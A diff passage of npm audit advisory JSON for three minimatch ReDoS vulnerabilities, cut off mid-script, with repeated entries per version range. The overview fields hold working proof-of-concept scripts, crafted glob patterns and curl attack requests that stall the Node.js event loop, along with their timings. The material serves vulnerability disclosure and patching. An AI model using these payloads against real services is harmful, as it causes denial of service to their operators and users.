+      "reported_by": null,
+      "title": "minimatch has a ReDoS via repeated wildcards with non-matching literal in pattern",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-26996"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "minimatch",
+      "vulnerable_versions": "<3.1.3",
+      "github_advisory_id": "GHSA-3ppc-4f35-3m26",
+      "recommendation": "Upgrade to version 3.1.3 or later",
+      "patched_versions": ">=3.1.3",
+      "updated": "2026-02-24T20:59:58.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-3ppc-4f35-3m26"
+    },
+    "1113465": {
+      "findings": [
+        {
+          "version": "9.0.5",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-3ppc-4f35-3m26\n- https://github.com/isaacs/minimatch/commit/2e111f3a79abc00fa73110195de2c0f2351904f5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-26996\n- https://github.com/advisories/GHSA-3ppc-4f35-3m26",
+      "created": "2026-02-18T22:38:11.000Z",
+      "id": 1113465,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n`minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn't appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.\n\nThe time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.\n\n\n### Details\n_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\n\n### PoC\nWhen minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`:\n\n```\n/^(?!\\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/\n```\n\nWhen the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential.\n### Impact\nAny application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:\n- File search/filter UIs that accept glob patterns\n- `.gitignore`-style filtering with user-defined rules\n- Build tools that accept glob configuration\n- Any API that exposes glob matching to untrusted input\n\n----\n\nThanks to @ljharb for back-porting the fix to legacy versions of minimatch.",
+      "reported_by": null,
+      "title": "minimatch has a ReDoS via repeated wildcards with non-matching literal in pattern",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-26996"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "minimatch",
+      "vulnerable_versions": ">=9.0.0 <9.0.6",
+      "github_advisory_id": "GHSA-3ppc-4f35-3m26",
+      "recommendation": "Upgrade to version 9.0.6 or later",
+      "patched_versions": ">=9.0.6",
+      "updated": "2026-02-24T20:59:58.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-3ppc-4f35-3m26"
+    },
+    "1113538": {
+      "findings": [
+        {
+          "version": "3.1.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27903\n- https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748\n- https://github.com/advisories/GHSA-7r86-cg39-jmmj",
+      "created": "2026-02-26T22:10:18.000Z",
+      "id": 1113538,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.\n\n---\n\n### Details\n\nThe vulnerable loop is in `matchOne()` at [`src/index.ts#L960`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960):\n\n```typescript\nwhile (fr < fl) {\n  ..\n  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {\n    ..\n    return true\n  }\n  ..\n  fr++\n}\n```\n\nWhen a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).\n\nThere is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input.\n\nMeasured timing with n=30 path segments:\n\n| k (globstars) | Pattern size | Time     |\n|---------------|--------------|----------|\n| 7             | 36 bytes     | ~154ms   |\n| 9             | 46 bytes     | ~1.2s    |\n| 11            | 56 bytes     | ~5.4s    |\n| 12            | 61 bytes     | ~9.7s    |\n| 13            | 66 bytes     | ~15.9s   |\n\n---\n\n### PoC\n\nTested on minimatch@10.2.2, Node.js 20.\n\n**Step 1 -- inline script**\n\n```javascript\nimport { minimatch } from 'minimatch'\n\n// k=9 globstars, n=30 path segments\n// pattern: 46 bytes, default options\nconst pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'\nconst path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'\n\nconst start = Date.now()\nminimatch(path, pattern)\nconsole.log(Date.now() - start + 'ms') // ~1200ms\n```\n\nTo scale the effect, increase k:\n\n```javascript\n// k=11 -> ~5.4s, k=13 -> ~15.9s\nconst k = 11\nconst pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b'\nconst path    = Array(30).fill('a').join('/')\nminimatch(path, pattern)\n```\n\nNo special options are required. This reproduces with the default `minimatch()` call.\n\n**Step 2 -- HTTP server (event loop starvation proof)**\n\nThe following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:\n\n```javascript\n// poc1-server.mjs\nimport http from 'node:http'\nimport { URL } from 'node:url'\nimport { minimatch } from 'minimatch'\n\nconst PORT = 3000\n\nconst server = http.createServer((req, res) => {\n  const url = new URL(req.url, `http://localhost:${PORT}`)\n  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }\n\n  const pattern = url.searchParams.get('pattern') ?? ''\n  const path    = url.searchParams.get('path') ?? ''\n\n  const start  = process.hrtime.bigint()\n  const result = minimatch(path, pattern)\n  const ms     = Number(process.hrtime.bigint() - start) / 1e6\n\n  res.writeHead(200, { 'Content-Type': 'application/json' })\n  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\\n')\n})\n\nserver.listen(PORT)\n```\n\nTerminal 1 -- start the server:\n```\nnode poc1-server.mjs\n```\n\nTerminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:\n```\ncurl \"http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa\" &\n```\n\nTerminal 3 -- while the attack is in-flight, send a benign request:\n```\ncurl -w \"\\ntime_total: %{time_total}s\\n\" \"http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz\"\n```\n\n**Observed output (Terminal 3):**\n```\n{\"result\":true,\"ms\":\"0\"}\n\ntime_total: 4.132709s\n```\n\nThe server reports `\"ms\":\"0\"` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:\n\n```\n{\"result\":true,\"ms\":\"0\"}\n\ntime_total: 0.001599s\n```\n\n---\n\n### Impact\n\nAny application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.",
+      "reported_by": null,
+      "title": "minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27903"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "minimatch",
+      "vulnerable_versions": "<3.1.3",
+      "github_advisory_id": "GHSA-7r86-cg39-jmmj",
+      "recommendation": "Upgrade to version 3.1.3 or later",
+      "patched_versions": ">=3.1.3",
+      "updated": "2026-02-26T22:10:20.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-7r86-cg39-jmmj"
+    },
+    "1113544": {
+      "findings": [
+        {
+          "version": "9.0.5",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27903\n- https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748\n- https://github.com/advisories/GHSA-7r86-cg39-jmmj",
+      "created": "2026-02-26T22:10:18.000Z",
+      "id": 1113544,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.\n\n---\n\n### Details\n\nThe vulnerable loop is in `matchOne()` at [`src/index.ts#L960`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960):\n\n```typescript\nwhile (fr < fl) {\n  ..\n  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {\n    ..\n    return true\n  }\n  ..\n  fr++\n}\n```\n\nWhen a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).\n\nThere is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input.\n\nMeasured timing with n=30 path segments:\n\n| k (globstars) | Pattern size | Time     |\n|---------------|--------------|----------|\n| 7             | 36 bytes     | ~154ms   |\n| 9             | 46 bytes     | ~1.2s    |\n| 11            | 56 bytes     | ~5.4s    |\n| 12            | 61 bytes     | ~9.7s    |\n| 13            | 66 bytes     | ~15.9s   |\n\n---\n\n### PoC\n\nTested on minimatch@10.2.2, Node.js 20.\n\n**Step 1 -- inline script**\n\n```javascript\nimport { minimatch } from 'minimatch'\n\n// k=9 globstars, n=30 path segments\n// pattern: 46 bytes, default options\nconst pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'\nconst path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'\n\nconst start = Date.now()\nminimatch(path, pattern)\nconsole.log(Date.now() - start + 'ms') // ~1200ms\n```\n\nTo scale the effect, increase k:\n\n```javascript\n// k=11 -> ~5.4s, k=13 -> ~15.9s\nconst k = 11\nconst pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b'\nconst path    = Array(30).fill('a').join('/')\nminimatch(path, pattern)\n```\n\nNo special options are required. This reproduces with the default `minimatch()` call.\n\n**Step 2 -- HTTP server (event loop starvation proof)**\n\nThe following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:\n\n```javascript\n// poc1-server.mjs\nimport http from 'node:http'\nimport { URL } from 'node:url'\nimport { minimatch } from 'minimatch'\n\nconst PORT = 3000\n\nconst server = http.createServer((req, res) => {\n  const url = new URL(req.url, `http://localhost:${PORT}`)\n  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }\n\n  const pattern = url.searchParams.get('pattern') ?? ''\n  const path    = url.searchParams.get('path') ?? ''\n\n  const start  = process.hrtime.bigint()\n  const result = minimatch(path, pattern)\n  const ms     = Number(process.hrtime.bigint() - start) / 1e6\n\n  res.writeHead(200, { 'Content-Type': 'application/json' })\n  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\\n')\n})\n\nserver.listen(PORT)\n```\n\nTerminal 1 -- start the server:\n```\nnode poc1-server.mjs\n```\n\nTerminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:\n```\ncurl \"http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa\" &\n```\n\nTerminal 3 -- while the attack is in-flight, send a benign request:\n```\ncurl -w \"\\ntime_total: %{time_total}s\\n\" \"http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz\"\n```\n\n**Observed output (Terminal 3):**\n```\n{\"result\":true,\"ms\":\"0\"}\n\ntime_total: 4.132709s\n```\n\nThe server reports `\"ms\":\"0\"` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:\n\n```\n{\"result\":true,\"ms\":\"0\"}\n\ntime_total: 0.001599s\n```\n\n---\n\n### Impact\n\nAny application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.",
+      "reported_by": null,
+      "title": "minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27903"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "minimatch",
+      "vulnerable_versions": ">=9.0.0 <9.0.7",
+      "github_advisory_id": "GHSA-7r86-cg39-jmmj",
+      "recommendation": "Upgrade to version 9.0.7 or later",
+      "patched_versions": ">=9.0.7",
+      "updated": "2026-02-26T22:10:20.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-7r86-cg39-jmmj"
+    },
+    "1113546": {
+      "findings": [
+        {
+          "version": "3.1.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-23c5-xmqv-rm74\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27904\n- https://github.com/isaacs/minimatch/commit/11d0df6165d15a955462316b26d52e5efae06fce\n- https://github.com/advisories/GHSA-23c5-xmqv-rm74",
+      "created": "2026-02-26T22:07:15.000Z",
+      "id": 1113546,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nNested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally.\n\n---\n\n### Details\n\nThe root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:\n\n```typescript\n: this.type === '*' && bodyDotAllowed ? `)?`\n: `)${this.type}`\n```\n\nThis produces the following regexps:\n\n| Pattern              | Generated regex                          |\n|----------------------|------------------------------------------|\n| `*(a\\|b)`            | `/^(?:a\\|b)*$/`                          |\n| `*(*(a\\|b))`         | `/^(?:(?:a\\|b)*)*$/`                     |\n| `*(*(*(a\\|b)))`      | `/^(?:(?:(?:a\\|b)*)*)*$/`               |\n| `*(*(*(*(a\\|b))))` | `/^(?:(?:(?:(?:a\\|b)*)*)*)*$/`          |\n\nThese are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.\n\nThe generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.\n\nMeasured times via `minimatch()`:\n\n| Pattern              | Input              | Time       |\n|----------------------|--------------------|------------|\n| `*(*(a\\|b))`         | `a` x30 + `z`      | ~68,000ms  |\n| `*(*(*(a\\|b)))`      | `a` x20 + `z`      | ~124,000ms |\n| `*(*(*(*(a\\|b))))` | `a` x25 + `z`      | ~116,000ms |\n| `*(a\\|a)`            | `a` x25 + `z`      | ~2,000ms   |\n\nDepth inflection at fixed input `a` x16 + `z`:\n\n| Depth | Pattern              | Time         |\n|-------|----------------------|--------------|\n| 1     | `*(a\\|b)`            | 0ms          |\n| 2     | `*(*(a\\|b))`         | 4ms          |\n| 3     | `*(*(*(a\\|b)))`      | 270ms        |\n| 4     | `*(*(*(*(a\\|b))))` | 115,000ms    |\n\nGoing from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.\n\n---\n\n### PoC\n\nTested on minimatch@10.2.2, Node.js 20.\n\n**Step 1 -- verify the generated regexps and timing (standalone script)**\n\nSave as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:\n\n```javascript\nimport { minimatch, Minimatch } from 'minimatch'\n\nfunction timed(fn) {\n  const s = process.hrtime.bigint()\n  let result, error\n  try { result = fn() } catch(e) { error = e }\n  const ms = Number(process.hrtime.bigint() - s) / 1e6\n  return { ms, result, error }\n}\n\n// Verify generated regexps\nfor (let depth = 1; depth <= 4; depth++) {\n  let pat = 'a|b'\n  for (let i = 0; i < depth; i++) pat = `*(${pat})`\n  const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString()\n  console.log(`depth=${depth} \"${pat}\" -> ${re}`)\n}\n// depth=1 \"*(a|b)\"          -> /^(?:a|b)*$/\n// depth=2 \"*(*(a|b))\"       -> /^(?:(?:a|b)*)*$/\n// depth=3 \"*(*(*(a|b)))\"    -> /^(?:(?:(?:a|b)*)*)*$/\n// depth=4 \"*(*(*(*(a|b))))\" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/\n\n// Safe-length timing (exponential growth confirmation without multi-minute hang)\nconst cases = [\n  ['*(*(*(a|b)))', 15],   // ~270ms\n  ['*(*(*(a|b)))', 17],   // ~800ms\n  ['*(*(*(a|b)))', 19],   // ~2400ms\n  ['*(*(a|b))',    23],   // ~260ms\n  ['*(a|b)',      101],   // <5ms (depth=1 control)\n]\nfor (const [pat, n] of cases) {\n  const t = timed(() => minimatch('a'.repeat(n) + 'z', pat))\n  console.log(`\"${pat}\" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`)\n}\n\n// Confirm noext disables the vulnerability\nconst t_noext = timed(() => minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }))\nconsole.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`)\n\n// +() is equally affected\nconst t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'))\nconsole.log(`\"+(+(+(a|b)))\" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`)\n```\n\nObserved output:\n```\ndepth=1 \"*(a|b)\"          -> /^(?:a|b)*$/\ndepth=2 \"*(*(a|b))\"       -> /^(?:(?:a|b)*)*$/\ndepth=3 \"*(*(*(a|b)))\"    -> /^(?:(?:(?:a|b)*)*)*$/\ndepth=4 \"*(*(*(*(a|b))))\" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/\n\"*(*(*(a|b)))\" n=15: 269ms result=false\n\"*(*(*(a|b)))\" n=17: 268ms result=false\n\"*(*(*(a|b)))\" n=19: 2408ms result=false\n\"*(*(a|b))\"    n=23: 257ms result=false\n\"*(a|b)\"       n=101: 0ms result=false\nnoext=true: 0ms (should be ~0ms)\n\"+(+(+(a|b)))\" n=18: 6300ms result=false\n```\n\n**Step 2 -- HTTP server (event loop starvation proof)**\n\nSave as `poc4-server.mjs`:\n\n```javascript\nimport http from 'node:http'\nimport { URL } from 'node:url'\nimport { minimatch } from 'minimatch'\n\nconst PORT = 3001\nhttp.createServer((req, res) => {\n  const url     = new URL(req.url, `http://localhost:${PORT}`)\n  const pattern = url.searchParams.get('pattern') ?? ''\n  const path    = url.searchParams.get('path') ?? ''\n\n  const start  = process.hrtime.bigint()\n  const result = minimatch(path, pattern)\n  const ms     = Number(process.hrtime.bigint() - start) / 1e6\n\n  console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern=\"${pattern}\" path=\"${path.slice(0,30)}\"`)\n  res.writeHead(200, { 'Content-Type': 'application/json' })\n  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\\n')\n}).listen(PORT, () => console.log(`listening on ${PORT}`))\n```\n\nTerminal 1 -- start the server:\n```\nnode poc4-server.mjs\n```\n\nTerminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately:\n```\ncurl \"http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz\" &\n```\n\nTerminal 3 -- send a benign request while the attack is in-flight:\n```\ncurl -w \"\\ntime_total: %{time_total}s\\n\" \"http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz\"\n```\n\n**Observed output -- Terminal 2 (attack):**\n```\n{\"result\":false,\"ms\":\"64149\"}\n```\n\n**Observed output -- Terminal 3 (benign, concurrent):**\n```\n{\"result\":false,\"ms\":\"0\"}\n\ntime_total: 63.022047s\n```\n\n**Terminal 1 (server log):**\n```\n[2026-02-20T09:41:17.624Z] pattern=\"*(*(*(a|b)))\" path=\"aaaaaaaaaaaaaaaaaaaz\"\n[2026-02-20T09:42:21.775Z] done in 64149ms result=false\n[2026-02-20T09:42:21.779Z] pattern=\"*(a|b)\" path=\"aaaz\"\n[2026-02-20T09:42:21.779Z] done in 0ms result=false\n```\n\nThe server reports `\"ms\":\"0\"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.\n\nNote: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.\n\n---\n\n### Impact\n\nAny context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.\n\nDepth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.\n\n`+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).\n\n**Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.",
+      "reported_by": null,
+      "title": "minimatch ReDoS: nested *() extglobs generate catastrophically backtracking regular expressions",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27904"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "minimatch",
+      "vulnerable_versions": "<3.1.4",
+      "github_advisory_id": "GHSA-23c5-xmqv-rm74",
+      "recommendation": "Upgrade to version 3.1.4 or later",
+      "patched_versions": ">=3.1.4",
+      "updated": "2026-02-26T22:07:15.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-23c5-xmqv-rm74"
+    },
+    "1113552": {
+      "findings": [
+        {
+          "version": "9.0.5",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-23c5-xmqv-rm74\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27904\n- https://github.com/isaacs/minimatch/commit/11d0df6165d15a955462316b26d52e5efae06fce\n- https://github.com/advisories/GHSA-23c5-xmqv-rm74",
+      "created": "2026-02-26T22:07:15.000Z",
+      "id": 1113552,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nNested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally.\n\n---\n\n### Details\n\nThe root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:\n\n```typescript\n: this.type === '*' && bodyDotAllowed ? `)?`\n: `)${this.type}`\n```\n\nThis produces the following regexps:\n\n| Pattern              | Generated regex                          |\n|----------------------|------------------------------------------|\n| `*(a\\|b)`            | `/^(?:a\\|b)*$/`                          |\n| `*(*(a\\|b))`         | `/^(?:(?:a\\|b)*)*$/`                     |\n| `*(*(*(a\\|b)))`      | `/^(?:(?:(?:a\\|b)*)*)*$/`               |\n| `*(*(*(*(a\\|b))))` | `/^(?:(?:(?:(?:a\\|b)*)*)*)*$/`          |\n\nThese are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.\n\nThe generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.\n\nMeasured times via `minimatch()`:\n\n| Pattern              | Input              | Time       |\n|----------------------|--------------------|------------|\n| `*(*(a\\|b))`         | `a` x30 + `z`      | ~68,000ms  |\n| `*(*(*(a\\|b)))`      | `a` x20 + `z`      | ~124,000ms |\n| `*(*(*(*(a\\|b))))` | `a` x25 + `z`      | ~116,000ms |\n| `*(a\\|a)`            | `a` x25 + `z`      | ~2,000ms   |\n\nDepth inflection at fixed input `a` x16 + `z`:\n\n| Depth | Pattern              | Time         |\n|-------|----------------------|--------------|\n| 1     | `*(a\\|b)`            | 0ms          |\n| 2     | `*(*(a\\|b))`         | 4ms          |\n| 3     | `*(*(*(a\\|b)))`      | 270ms        |\n| 4     | `*(*(*(*(a\\|b))))` | 115,000ms    |\n\nGoing from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.\n\n---\n\n### PoC\n\nTested on minimatch@10.2.2, Node.js 20.\n\n**Step 1 -- verify the generated regexps and timing (standalone script)**\n\nSave as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:\n\n```javascript\nimport { minimatch, Minimatch } from 'minimatch'\n\nfunction timed(fn) {\n  const s = process.hrtime.bigint()\n  let result, error\n  try { result = fn() } catch(e) { error = e }\n 